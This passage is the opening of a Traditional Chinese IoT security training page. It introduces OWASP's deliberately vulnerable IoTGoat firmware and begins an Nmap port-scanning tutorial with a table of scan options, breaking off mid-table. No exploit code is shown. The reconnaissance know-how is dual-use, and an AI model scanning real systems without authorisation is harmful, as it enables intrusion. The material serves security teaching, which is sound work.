@@ -1,0 +1,1943 @@
+<!DOCTYPE html>
+<html lang="zh-tw" dir="ltr" class="scroll-smooth" data-default-appearance="light"
+  data-auto-appearance="true"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8" />
+  
+  <meta http-equiv="content-language" content="zh-tw" />
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+  
+  <title>4. IoT 設備檢測實戰演練 &middot; Tonya&#39;s Edger Corner</title>
+  <meta name="title" content="4. IoT 設備檢測實戰演練 &middot; Tonya&#39;s Edger Corner" />
+  
+  
+  
+  
+  
+  <link rel="canonical" href="http://localhost:1313/materials/iot_security/exercise/" />
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  <link type="text/css" rel="stylesheet" href="/css/main.bundle.min.54382a1f2108c95a3b5170a2b42b9b0228b09f9d37a7c2d07108bb31a6a56440ecc43c4e2b0f6e296b53b50368d6647d4666579d135af38642318f6ec030e8ad.css"
+    integrity="sha512-VDgqHyEIyVo7UXCitCubAiiwn503p8LQcQi7MaalZEDsxDxOKw9uKWtTtQNo1mR9RmZXnRNa84ZCMY9uwDDorQ==" />
+  
+  
+  <script type="text/javascript" src="/js/appearance.min.516a16745bea5a9bd011138d254cc0fd3973cd55ce6e15f3dec763e7c7c2c7448f8fe7b54cca811cb821b0c7e12cd161caace1dd794ac3d34d40937cbcc9ee12.js"
+    integrity="sha512-UWoWdFvqWpvQERONJUzA/TlzzVXObhXz3sdj58fCx0SPj&#43;e1TMqBHLghsMfhLNFhyqzh3XlKw9NNQJN8vMnuEg=="></script>
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  <script defer type="text/javascript" id="script-bundle" src="/js/main.bundle.min.8613168837e35f3f882df60a8a810e212d581a4eea26eeb2554e527c6eab9e57acc03a2533cbd5c6084f825ce3a655953923f21e1de2e6b8014eddf510fa58e7.js"
+    integrity="sha512-hhMWiDfjXz&#43;ILfYKioEOIS1YGk7qJu6yVU5SfG6rnleswDolM8vVxghPglzjplWVOSPyHh3i5rgBTt31EPpY5w==" data-copy="" data-copied=""></script>
+  
+  
+  
+  <script src="/lib/zoom/zoom.min.fcbc7f7b3dcea96e3b5570cd322c5d7a12d5351c87f9889b1c31745a2cc711df58f6b70795a86d50e63813b236ade916668332c10a70a4ce26f7c0878f525fce.js" integrity="sha512-/Lx/ez3OqW47VXDNMixdehLVNRyH&#43;YibHDF0WizHEd9Y9rcHlahtUOY4E7I2rekWZoMywQpwpM4m98CHj1Jfzg=="></script>
+  
+  
+  
+  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
+  <link rel="manifest" href="/site.webmanifest" />
+  
+  
+  
+  
+  
+  
+  
+  <meta property="og:url" content="http://localhost:1313/materials/iot_security/exercise/">
+  <meta property="og:site_name" content="Tonya&#39;s Edger Corner">
+  <meta property="og:title" content="4. IoT 設備檢測實戰演練">
+  <meta property="og:locale" content="zh_tw">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="materials">
+    <meta property="article:published_time" content="2024-09-08T00:00:00+00:00">
+    <meta property="article:modified_time" content="2024-09-08T00:00:00+00:00">
+      <meta property="og:see_also" content="http://localhost:1313/materials/iot_security/web_application_security_vulnerabilities/">
+      <meta property="og:see_also" content="http://localhost:1313/materials/iot_security/basic_knowledge/">
+      <meta property="og:see_also" content="http://localhost:1313/materials/iot_security/introduction/">
+
+  
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="4. IoT 設備檢測實戰演練">
+
+  
+  <script type="application/ld+json">
+  [{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "articleSection": "各種資安教材",
+    "name": "4. IoT 設備檢測實戰演練",
+    "headline": "4. IoT 設備檢測實戰演練",
+    
+    
+    "inLanguage": "zh-tw",
+    "url" : "http:\/\/localhost:1313\/materials\/iot_security\/exercise\/",
+    "author" : {
+      "@type": "Person",
+      "name": "Tonya"
+    },
+    "copyrightYear": "2024",
+    "dateCreated": "2024-09-08T00:00:00\u002b00:00",
+    "datePublished": "2024-09-08T00:00:00\u002b00:00",
+    
+    "dateModified": "2024-09-08T00:00:00\u002b00:00",
+    
+    
+    
+    "mainEntityOfPage": "true",
+    "wordCount": "5189"
+  }]
+  </script>
+
+
+  
+  
+  <meta name="author" content="Tonya" />
+  
+  
+  
+
+<script src="/lib/jquery/jquery.slim.min.03cb160e3cfdb2667a2e2c80d283bebcf63ff8bbc4b629c9ab2babf6fae1d0c07ad470edae783efa4fabda2ac01c58d60e63b98b3c336be8208460f08f4354f5.js" integrity="sha512-A8sWDjz9smZ6LiyA0oO&#43;vPY/&#43;LvEtinJqyur9vrh0MB61HDtrng&#43;&#43;k&#43;r2irAHFjWDmO5izwza&#43;gghGDwj0NU9Q=="></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+
+
+
+  
+  
+  <meta name="theme-color"/>
+  
+  
+</head>
+<body
+  class="flex flex-col h-screen px-6 m-auto text-lg leading-7 max-w-7xl bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32 scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600">
+  <div id="the-top" class="absolute flex self-center">
+    <a class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600"
+      href="#main-content"><span
+        class="font-bold text-primary-600 ltr:pr-2 rtl:pl-2 dark:text-primary-400">&darr;</span>快轉到主要內容</a>
+  </div>
+  
+  
+  <div style="padding-left:0;padding-right:0;padding-top:2px;padding-bottom:3px"
+    class="main-menu flex items-center justify-between px-4 py-6 sm:px-6 md:justify-start space-x-3">
+    
+    <div class="flex flex-1 items-center justify-between">
+        <nav class="flex space-x-3">
+
+            
+            <a href="/" class="text-base font-medium text-gray-500 hover:text-gray-900">Tonya&rsquo;s Edger Corner</a>
+            
+
+        </nav>
+        <nav class="hidden md:flex items-center space-x-5 md:ml-12 h-12">
+
+            
+            
+            
+  <a href="/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+    
+    <p class="text-base font-medium" title="">
+        Home
+    </p>
+</a>
+
+
+
+            
+            
+  <a href="/blogs/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+    
+    <p class="text-base font-medium" title="">
+        Blogs
+    </p>
+</a>
+
+
+
+            
+             
+  <div>
+  <div class="cursor-pointer flex items-center nested-menu">
+    
+    <a  href="/materials/"   class="text-base font-medium text-gray-500 hover:text-primary-600 dark:hover:text-primary-400" title="">
+      Materials
+    </a>
+    <span>
+      
+
+  <span class="relative block icon">
+    <svg
+  xmlns="http://www.w3.org/2000/svg"
+  viewBox="0 0 20 20"
+  fill="currentColor"
+  aria-hidden="true"
+>
+  <path
+    fill-rule="evenodd"
+    d="M5.23 7.21a.75.75 0 011.06.02L10 11.168l3.71-3.938a.75.75 0 111.08 1.04l-4.25 4.5a.75.75 0 01-1.08 0l-4.25-4.5a.75.75 0 01.02-1.06z"
+    clip-rule="evenodd"
+  />
+</svg>
+
+  </span>
+
+
+    </span>
+  </div>
+  <div class="absolute menuhide">
+    <div class="pt-2 p-5 mt-2 rounded-xl backdrop-blur shadow-2xl">
+      <div class="flex flex-col space-y-3">
+        
+        <a href="/materials/iot_security/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+          
+          <p class="text-sm font-sm" title="">
+            IoT Security
+          </p>
+        </a>
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+
+
+            
+            
+  <a href="/prose/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+    
+    <p class="text-base font-medium" title="">
+        Prose
+    </p>
+</a>
+
+
+
+            
+            
+
+            
+
+
+            
+            <button id="search-button" aria-label="Search" class="text-base hover:text-primary-600 dark:hover:text-primary-400"
+                title="">
+                
+
+  <span class="relative block icon">
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+  </span>
+
+
+            </button>
+            
+
+
+            
+            
+            <div
+                class="ltr:mr-14 rtl:ml-14 flex items-center">
+                <button id="appearance-switcher" aria-label="Dark mode switcher" type="button" class="text-base hover:text-primary-600 dark:hover:text-primary-400">
+                    <div class="flex items-center justify-center dark:hidden">
+                        
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+
+  </span>
+
+
+                    </div>
+                    <div class="items-center justify-center hidden dark:flex">
+                        
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+
+  </span>
+
+
+                    </div>
+                </button>
+            </div>
+            
+
+        </nav>
+        <div class="flex md:hidden items-center space-x-5 md:ml-12 h-12">
+
+            <span></span>
+
+            
+
+
+            
+            <button id="search-button-mobile" aria-label="Search" class="text-base hover:text-primary-600 dark:hover:text-primary-400"
+                title="">
+                
+
+  <span class="relative block icon">
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+  </span>
+
+
+            </button>
+            
+
+            
+            
+            <button id="appearance-switcher-mobile" aria-label="Dark mode switcher" type="button" class="text-base hover:text-primary-600 dark:hover:text-primary-400" style="margin-right:5px">
+                <div class="flex items-center justify-center dark:hidden">
+                    
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+
+  </span>
+
+
+                </div>
+                <div class="items-center justify-center hidden dark:flex">
+                    
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+
+  </span>
+
+
+                </div>
+            </button>
+            
+
+        </div>
+    </div>
+    <div class="-my-2 -mr-2 md:hidden">
+
+        <label id="menu-button" class="block">
+            
+            <div class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400">
+                
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416C433.7 64 448 78.33 448 96C448 113.7 433.7 128 416 128H32C14.33 128 0 113.7 0 96zM0 256C0 238.3 14.33 224 32 224H416C433.7 224 448 238.3 448 256C448 273.7 433.7 288 416 288H32C14.33 288 0 273.7 0 256zM416 448H32C14.33 448 0 433.7 0 416C0 398.3 14.33 384 32 384H416C433.7 384 448 398.3 448 416C448 433.7 433.7 448 416 448z"/></svg>
+
+  </span>
+
+
+            </div>
+            <div id="menu-wrapper" style="padding-top:5px;"
+                class="fixed inset-0 z-30 invisible w-screen h-screen m-0 overflow-auto transition-opacity opacity-0 cursor-default bg-neutral-100/50 backdrop-blur-sm dark:bg-neutral-900/50">
+                <ul
+                    class="flex space-y-2 mt-3 flex-col items-end w-full px-6 py-6 mx-auto overflow-visible list-none ltr:text-right rtl:text-left max-w-7xl">
+
+                    <li id="menu-close-button">
+                        <span
+                            class="cursor-pointer inline-block align-text-bottom hover:text-primary-600 dark:hover:text-primary-400">
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+
+  </span>
+
+</span>
+                    </li>
+
+                    
+
+                    
+  <li class="mt-1">
+    <a href="/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+        
+        <p class="text-bg font-bg" title="">
+            Home
+        </p>
+    </a>
+</li>
+
+
+
+
+                    
+
+                    
+  <li class="mt-1">
+    <a href="/blogs/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+        
+        <p class="text-bg font-bg" title="">
+            Blogs
+        </p>
+    </a>
+</li>
+
+
+
+
+                    
+
+                     
+  <li class="mt-1">
+    <a class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+        
+        <p class="text-bg font-bg" title="">
+            Materials
+        </p>
+        <span>
+            
+
+  <span class="relative block icon">
+    <svg
+  xmlns="http://www.w3.org/2000/svg"
+  viewBox="0 0 20 20"
+  fill="currentColor"
+  aria-hidden="true"
+>
+  <path
+    fill-rule="evenodd"
+    d="M5.23 7.21a.75.75 0 011.06.02L10 11.168l3.71-3.938a.75.75 0 111.08 1.04l-4.25 4.5a.75.75 0 01-1.08 0l-4.25-4.5a.75.75 0 01.02-1.06z"
+    clip-rule="evenodd"
+  />
+</svg>
+
+  </span>
+
+
+        </span>
+    </a>
+</li>
+
+<li class="mt-1">
+    <a href="/materials/iot_security/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+        
+        <p class="text-sm font-small" title="">
+            IoT Security
+        </p>
+    </a>
+</li>
+
+<li class="mb-2"></li>
+
+
+
+
+                    
+
+                    
+  <li class="mt-1">
+    <a href="/prose/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+        
+        <p class="text-bg font-bg" title="">
+            Prose
+        </p>
+    </a>
+</li>
+
+
+
+
+                    
+
+                </ul>
+                
+                
+
+            </div>
+        </label>
+    </div>
+</div>
+
+
+
+
+
+  
+  <div class="relative flex flex-col grow">
+    <main id="main-content" class="grow">
+      
+
+
+<article>
+  
+  
+  
+  
+  
+  
+ 
+  
+   
+  
+ 
+
+        
+            <div class="w-full h-36 md:h-56 lg:h-72 single_hero_basic nozoom" style="background-image:url(/img/background_hu5586356105617036979.png);"></div>
+        
+    
+  
+  
+
+
+  <div id="progbar"></div>
+  
+
+  <header id="single_header" class="mt-5 max-w-prose">
+    
+    <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
+      4. IoT 設備檢測實戰演練
+    </h1>
+    <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
+      
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="flex flex-row flex-wrap items-center">
+  
+  
+  <time datetime="2024-09-08T00:00:00&#43;00:00">8 September 2024</time><span class="px-2 text-primary-500">&middot;</span><span>5189 字</span><span class="px-2 text-primary-500">&middot;</span><span title="預計閱讀時間">11 分鐘</span>
+  
+
+  
+  
+</div>
+
+
+
+
+
+<div class="flex flex-row flex-wrap items-center">
+  
+  
+  
+  
+  
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/categories/iot_security/&#34;,'_self');">
+    <span class="flex" style="cursor: pointer;">
+  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    IoT_Security
+  </span>
+</span>
+  </span>
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/categories/materials/&#34;,'_self');">
+    <span class="flex" style="cursor: pointer;">
+  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Materials
+  </span>
+</span>
+  </span>
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+</div>
+
+
+
+
+    </div>
+
+    
+    
+    
+    
+    
+
+    
+
+    
+
+  </header>
+  <script src='/js/progbar.js'></script>
+
+  <section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row">
+
+     <div
+      class="order-first lg:ml-auto px-0 lg:order-last ltr:lg:pl-8 rtl:lg:pr-8">
+      <div class="toc ltr:pl-5 rtl:pr-5 print:hidden lg:sticky lg:top-10">
+
+         <details open id="TOCView"
+  class="toc-right mt-0 overflow-y-scroll overscroll-contain scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600 rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 hidden lg:block">
+  <summary
+    class="block py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
+    目錄
+  </summary>
+  <div
+    class="min-w-[220px] py-2 border-dotted ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#情蒐與分析">🦉情蒐與分析</a>
+      <ul>
+        <li><a href="#iotgoat">🐧IoTGoat</a></li>
+        <li><a href="#情資蒐集">🐧情資蒐集</a></li>
+        <li><a href="#韌體分析">🐧韌體分析</a></li>
+      </ul>
+    </li>
+    <li><a href="#i1-脆弱和寫死的密碼">🦉I1 脆弱和寫死的密碼</a></li>
+    <li><a href="#i2-不安全的網路服務">🦉I2 不安全的網路服務</a></li>
+    <li><a href="#i3-不安全的生態介面">🦉I3 不安全的生態介面</a></li>
+    <li><a href="#i4-缺乏安全的更新機制">🦉I4 缺乏安全的更新機制</a></li>
+    <li><a href="#i5-使用不安全或是過時的元件">🦉I5 使用不安全或是過時的元件</a></li>
+    <li><a href="#i6-隱私保護不足">🦉I6 隱私保護不足</a></li>
+    <li><a href="#i7-不安全的資料傳輸和存儲">🦉I7 不安全的資料傳輸和存儲</a></li>
+    <li><a href="#i8-缺乏設備管理">🦉I8 缺乏設備管理</a></li>
+    <li><a href="#i9-不安全的初始設置">🦉I9 不安全的初始設置</a></li>
+    <li><a href="#i10-缺乏物理防禦">🦉I10 缺乏物理防禦</a></li>
+  </ul>
+</nav>
+  </div>
+</details>
+<details class="toc-inside mt-0 overflow-hidden rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 lg:hidden">
+  <summary
+    class="py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
+    目錄
+  </summary>
+  <div
+    class="py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#情蒐與分析">🦉情蒐與分析</a>
+      <ul>
+        <li><a href="#iotgoat">🐧IoTGoat</a></li>
+        <li><a href="#情資蒐集">🐧情資蒐集</a></li>
+        <li><a href="#韌體分析">🐧韌體分析</a></li>
+      </ul>
+    </li>
+    <li><a href="#i1-脆弱和寫死的密碼">🦉I1 脆弱和寫死的密碼</a></li>
+    <li><a href="#i2-不安全的網路服務">🦉I2 不安全的網路服務</a></li>
+    <li><a href="#i3-不安全的生態介面">🦉I3 不安全的生態介面</a></li>
+    <li><a href="#i4-缺乏安全的更新機制">🦉I4 缺乏安全的更新機制</a></li>
+    <li><a href="#i5-使用不安全或是過時的元件">🦉I5 使用不安全或是過時的元件</a></li>
+    <li><a href="#i6-隱私保護不足">🦉I6 隱私保護不足</a></li>
+    <li><a href="#i7-不安全的資料傳輸和存儲">🦉I7 不安全的資料傳輸和存儲</a></li>
+    <li><a href="#i8-缺乏設備管理">🦉I8 缺乏設備管理</a></li>
+    <li><a href="#i9-不安全的初始設置">🦉I9 不安全的初始設置</a></li>
+    <li><a href="#i10-缺乏物理防禦">🦉I10 缺乏物理防禦</a></li>
+  </ul>
+</nav>
+  </div>
+</details>
+
+<script>
+
+  var margin = 200;
+  var marginError = 50;
+
+  (function () {
+    var $window = $(window);
+    var $toc = $('#TOCView');
+    var tocHeight = $toc.height();
+
+    function onResize() {
+      var windowAndMarginHeight = $window.height() - margin;
+      if(tocHeight >= windowAndMarginHeight) {
+        $toc.css("overflow-y", "scroll")
+        $toc.css("max-height", (windowAndMarginHeight + marginError) + "px")
+      } else {
+        $toc.css("overflow-y", "hidden")
+        $toc.css("max-height", "9999999px")
+      }
+    }
+
+    $window.on('resize', onResize);
+    $(document).ready(onResize);
+  })();
+
+
+
+</script>
+   </div>
+      </div>
+      
+
+      <div class="min-w-0 min-h-0 max-w-fit">
+
+        
+<details style="margin-left:0px" class="mt-2 mb-5 overflow-hidden rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5" >
+    
+    <summary
+        class="py-1 text-lg font-semibold cursor-pointer bg-primary-200 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-primary-800 dark:text-neutral-100">
+        IoT 設備檢測實務：攻擊實戰與防禦指南 - 本文屬於一個選集。
+    </summary>
+    
+    
+    
+    <div
+        class="py-1 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
+        <a href="http://localhost:1313/materials/iot_security/introduction/">
+            § 1: 1. IoT 設備安全簡介
+        </a>
+    </div>
+    
+    
+    
+    <div
+        class="py-1 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
+        <a href="http://localhost:1313/materials/iot_security/basic_knowledge/">
+            § 2: 2. IoT 設備安全基礎知識
+        </a>
+    </div>
+    
+    
+    
+    <div
+        class="py-1 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
+        <a href="http://localhost:1313/materials/iot_security/web_application_security_vulnerabilities/">
+            § 3: 3. IoT 網路應用系統安全弱點
+        </a>
+    </div>
+    
+    
+    
+    <div
+        class="py-1 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
+        § 4: 本文
+    </div>
+    
+    
+
+
+</details>
+
+
+
+        <div class="article-content max-w-prose mb-20">
+          
+
+<h2 class="relative group">🦉情蒐與分析 
+    <div id="%E6%83%85%E8%92%90%E8%88%87%E5%88%86%E6%9E%90" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#%E6%83%85%E8%92%90%E8%88%87%E5%88%86%E6%9E%90" aria-label="定位點">#</a>
+    </span>        
+    
+</h2>
+
+
+<h3 class="relative group">🐧IoTGoat 
+    <div id="iotgoat" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#iotgoat" aria-label="定位點">#</a>
+    </span>        
+    
+</h3>
+<p>IoTGoat 是一個由 OWASP 維護的專案，提供一個不安全的韌體平台讓學員能夠親自進行漏洞測試和分析。此專案包含了 OWASP IoT Top 10 2018 的所有弱點，可以透過該專案學習並實踐漏洞分析的技術以研究並理解 IoT 設備的常見安全漏洞以及防禦方法。我們將在本課程中使用 IoTGoat 並結合 OWASP Top 10 2021 進行實踐，以幫助學員理解課程中的知識。</p>
+
+
+<h3 class="relative group">🐧情資蒐集 
+    <div id="%E6%83%85%E8%B3%87%E8%92%90%E9%9B%86" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#%E6%83%85%E8%B3%87%E8%92%90%E9%9B%86" aria-label="定位點">#</a>
+    </span>        
+    
+</h3>
+<p>Nmap 是一個開源的網路探測及埠掃描工具。能夠檢測開放的埠、運行的服務版本、及作業系統等資訊。此外，Nmap 還具有腳本引擎，能通過腳本執行更多擴充功能，如：漏洞掃描、服務偵測等。</p>
+<p>使用 Nmap 時通常依照以下格式執行：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap <span class="o">{</span>options<span class="o">}</span> IP_ADDRESS
+</span></span></code></pre></div><p>以下是常用選項及說明：</p>
+<table>
+  <thead>
+      <tr>
+          <th style="text-align: left">選項</th>
+          <th style="text-align: left">說明</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: left"><code>-sC</code></td>
+          <td style="text-align: left">使用預設的腳本對目標進行掃描。可以獲得目標服務的詳細資訊。對 HTTP 服務會進行簡單的路徑掃描、對 FTP 服務會檢查是否允許匿名登入等。</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><code>-sV</code></td>
+          <td style="text-align: left">詳細掃描目標服務並獲得其版本資訊。通常用來確認目標服務是否存在版本過舊的問題，或是否在非預設埠上運行。</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><code>-sU</code></td>
